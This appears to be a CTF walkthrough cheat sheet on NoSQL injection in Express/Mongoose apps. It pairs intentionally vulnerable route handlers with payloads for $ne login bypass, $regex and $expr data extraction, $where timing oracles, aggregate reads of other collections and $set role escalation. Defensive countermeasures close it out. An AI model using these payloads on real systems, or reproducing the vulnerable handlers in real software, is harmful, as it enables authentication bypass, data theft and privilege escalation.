# CTF walkthroughs — the canonical NoSQLi solve-shapes

## The `$ne` login-bypass — the classic

```javascript
// app.js — the standard shape
app.post('/login', async (req, res) => {
  const user = await User.findOne({user: req.body.user, pass: req.body.pass})
  if (user) res.json({token: sign(user)})
  else res.status(401).json({error: 'invalid'})
})
```

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
```

`findOne` returns the FIRST doc — the seed-admin — the token's identity —
`auth-bypass.md` — prove via a read endpoint, not the login-response.

## The `findOne` first-doc — the admin-landing

`findOne({$ne: null})` — the first doc — usually `admin`/`root`/`system`
— the insertion-order — `mongo-specific.md` — the flag lives in the
admin-doc's `flag`/`secret`/`token` field or the admin's profile-page.

## The `$regex` extraction — the flag-walk

```javascript
app.post('/search', async (req, res) => {
  const users = await User.find({user: {$regex: req.body.q}})
  res.json({users})
})
```

`{"q": "^flag\\{"}` — the regex-filter — `extraction.md` — the flag-field's
prefix-walk.

## The `$where` RCE — the `sleep` side-channel

```javascript
app.post('/search', async (req, res) => {
  const users = await User.find({$where: req.body.q})
  res.json({users})
})
```

`{"q": "this.pass[0] == 'f' ? sleep(3000) : true"}` — the timing —
`operators-js.md` — `enableJs` required — 3× jitter baseline.

## The `aggregate` `$unionWith` — the flag-collection

```javascript
app.post('/api/agg', async (req, res) => {
  const r = await User.aggregate(req.body.pipeline)
  res.json({r})
})
```

```json
{"pipeline": [{"$unionWith": "flag"}]}
{"pipeline": [{"$lookup": {"from": "flag", "localField": "x", "foreignField": "y", "as": "f"}}]}
{"pipeline": [{"$project": {"flag": 1}}]}
{"pipeline": [{"$match": {"flag": {"$exists": true}}}]}
{"pipeline": [{"$unionWith": "secrets"}]}
{"pipeline": [{"$unionWith": {"coll": "flag", "pipeline": [{"$match": {}}]}}]}
```

`aggregation.md` — the array-body — the flag-collection's name-guess —
`flag`/`secret`/`credentials`/`flags`/`keys`/`tokens`/`admin`/`system`.

## The `updateOne` `$set` — the role-escalation

```javascript
app.post('/profile', async (req, res) => {
  await User.updateOne({user: req.body.user}, req.body.update)
  res.json({ok: true})
})
```

```json
{"user": "me", "update": {"$set": {"role": "admin"}}}
{"user": "me", "update": {"$set": {"isAdmin": true}}}
{"user": "me", "update": {"$unset": {"isLocked": ""}}}
{"user": "me", "update": {"$inc": {"balance": 9999}}}
{"user": "me", "update": {"$push": {"roles": "admin"}}}
{"user": "me", "update": {"$addToSet": {"perms": "*"}}}
{"user": "me", "update": {"$rename": {"flag": "user"}}}
{"user": "me", "update": {"$set": {"flag": "x"}}, "then-read": "/flag"}
```

`update-injection.md` — test on solver-created objects only.

## The `distinct` — the unique-values

```javascript
app.get('/roles', async (req, res) => {
  const roles = await User.distinct("role", {user: req.query.user})
  res.json({roles})
})
```

`{"user": {"$ne": null}}` — `distinct("role")` — the unique-values —
`mongo-specific.md`.

## The `count` — the count-oracle

```javascript
app.get('/count', async (req, res) => {
  const n = await User.countDocuments({user: req.query.user})
  res.json({n})
})
```

`{"user": {"$ne": null}}` — `countDocuments` — `mongo-specific.md`.

## The `qs`-carrier — `extended: true`

```javascript
app.use(express.urlencoded({extended: true}))
app.post('/login', async (req, res) => {
  const user = await User.findOne({user: req.body.user, pass: req.body.pass})
})
```

`user[$ne]=x&pass[$ne]=x` — the qs-carrier — `carrier-qs-deep.md`.

## The `JSON.parse` — the string-carrier

```javascript
app.post('/search', async (req, res) => {
  const q = JSON.parse(req.body.q)
  const users = await User.find(q)
})
```

`{"q": "{\"user\": {\"$ne\": null}}"}` — the string-JSON —
`carrier-json-deep.md`.

## The `filter`/`where`/`q` — the wrapper

```javascript
app.post('/search', async (req, res) => {
  const users = await User.find(req.body.filter)
})
```

`{"filter": {"user": {"$ne": null}}}` — the wrapper-carrier —
`injection-points.md`.

## The `MongoDB` `$expr` — the agg-operators

```javascript
app.post('/search', async (req, res) => {
  const users = await User.find({$expr: req.body.expr})
})
```

```json
{"expr": {"$eq": [{"$substrCP": ["$pass", 0, 4]}, "flag"]}}
{"expr": {"$eq": [{"$strLenCP": "$pass"}, 32]}}
{"expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
{"expr": {"$eq": [{"$indexOfCP": ["$pass", "{"]}, 4]}}
{"expr": {"$eq": [{"$toUpper": "$pass"}, "FLAG{X}"]}}
{"expr": {"$eq": [{"$strcasecmp": ["$pass", "flag{x}"]}, 0]}}
{"expr": {"$eq": [{"$convert": {"input": "$pass", "to": "string"}}, "flag{x}"]}}
{"expr": {"$eq": [{"$toString": "$pass"}, "flag{x}"]}}
{"expr": {"$eq": [{"$type": "$pass"}, "string"]}}
{"expr": {"$eq": [{"$isArray": "$pass"}, true]}}
{"expr": {"$eq": [{"$arrayElemAt": [{"$split": ["$pass", "{"]}, 1]}, "x}"]}}
{"expr": {"$eq": [{"$arrayElemAt": [{"$split": ["$pass", "{"]}, 0]}, "flag"]}}
{"expr": {"$eq": [{"$split": ["$pass", "{"]}, ["flag", "x}"]]}}
{"expr": {"$eq": [{"$ltrim": {"input": "$pass", "chars": " "}}, "flag{x}"]}}
{"expr": {"$eq": [{"$rtrim": {"input": "$pass", "chars": " "}}, "flag{x}"]}}
{"expr": {"$eq": [{"$trim": {"input": "$pass", "chars": " "}}, "flag{x}"]}}
{"expr": {"$eq": [{"$toObjectId": "$_id"}, {"$oid": "..."}]}}
{"expr": {"$eq": [{"$dateFromString": {"dateString": "$pass"}}, {"$date": "..."}]}}
{"expr": {"$eq": [{"$dateToString": {"date": "$pass", "format": "%Y-%m-%d"}}, "2024-01-01"]}}
```

`operators-aggregation.md`.

## The `enableJs` falsifier — the `$where` dead

```text
MongoServerError: $where is not allowed
```

`enableJs` off — the `$where`/`$function`/`$accumulator`/`mapReduce`
dead — `denied-conditions.md` — `$expr` still works.

## The `String()` falsifier — the object-stringified

```javascript
app.post('/login', async (req, res) => {
  const user = await User.findOne({user: String(req.body.user)})
})
```

`{$ne: null}` → `"[object Object]"` — `denied-conditions.md`.

## The `sanitizeFilter` falsifier — the `$`-strip

```javascript
const filter = mongoose.sanitizeFilter(req.body)
User.findOne(filter)
```

`filter-bypass.md` — the `$`/`.`-strip — the nested-depth or
non-`$`/`non-`.`-key carrier.

## The `strictQuery` falsifier — the unknown-key strip

```javascript
mongoose.set('strictQuery', true)
```

`filter-bypass.md` — the non-schema keys stripped — `$`-keys at the
ROOT die, inside a schema-typed field survive.

## The `CastError` falsifier — the type-mismatch

```javascript
User.findOne({user: {$ne: null}})  — user: String → CastError
```

`mongo-specific.md` — the String/Number/ObjectId cast — a `Mixed`/`Object`/
`Map` field is the free-pass.

## The `bcrypt` falsifier — the compare-throws

```javascript
bcrypt.compare({$ne: null}, hash)  — throws
```

`auth-bypass.md` — the pass-object throws — use a different vector.

## The `enableJs` + `sleep` — the timing-chain

```javascript
{"user": "admin", "$where": "this.pass[0] == 'f' ? sleep(3000) : true"}
```

`operators-js.md` — the timing-oracle — 3× jitter, 2+ repeaters.
